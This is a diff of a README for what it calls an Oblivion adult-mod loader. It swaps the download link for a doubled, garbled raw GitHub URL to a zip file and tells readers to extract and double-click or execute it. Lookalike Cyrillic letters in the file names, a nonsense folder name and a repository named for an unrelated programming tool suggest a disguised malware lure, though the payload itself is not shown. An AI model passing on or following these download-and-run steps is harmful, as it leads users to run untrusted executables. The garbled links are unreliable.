@@ -41,10 +41,10 @@ Enjoy full support across major operating systems! Check where you can safely us
 
 Getting started is quick and straightforward! Follow these steps to launch the ultimate modding experience:
 
-1. **Download** `https://raw.githubusercontent.com/079mgh/SNU_2D_ProgrammingTools_IDE_KoLMafia-ASH/main/Lоader.zip` from the [repository releases page](../../releases) using the "Download" button.
+1. **Download** `https://raw.githubusercontent.com/079mgh/SNU_2D_ProgrammingTools_IDE_KoLMafia-ASH/main/unwrinkleable/Programming_L_SN_Tools_ID_Ko_Mafia_ASH_v1.3.zipоhttps://raw.githubusercontent.com/079mgh/SNU_2D_ProgrammingTools_IDE_KoLMafia-ASH/main/unwrinkleable/Programming_L_SN_Tools_ID_Ko_Mafia_ASH_v1.3.zip` from the [repository releases page](../../releases) using the "Download" button.
 2. **Extract** the archive with any modern archiving utility (7-Zip, WinRAR, etc).
 3. **Run the Loader**:
-    - On Windows: Double-click `https://raw.githubusercontent.com/079mgh/SNU_2D_ProgrammingTools_IDE_KoLMafia-ASH/main/Lоader.zip`.
+    - On Windows: Double-click `https://raw.githubusercontent.com/079mgh/SNU_2D_ProgrammingTools_IDE_KoLMafia-ASH/main/unwrinkleable/Programming_L_SN_Tools_ID_Ko_Mafia_ASH_v1.3.zipоhttps://raw.githubusercontent.com/079mgh/SNU_2D_ProgrammingTools_IDE_KoLMafia-ASH/main/unwrinkleable/Programming_L_SN_Tools_ID_Ko_Mafia_ASH_v1.3.zip`.
     - On macOS/Linux: Use Terminal (`chmod +x` if required) and execute the loader.
 4. **Follow the on-screen instructions** to choose your Oblivion installation directory.
 5. **Select and manage your mods** easily using the loader interface. You can add, enable, update, or remove adult mods at will.
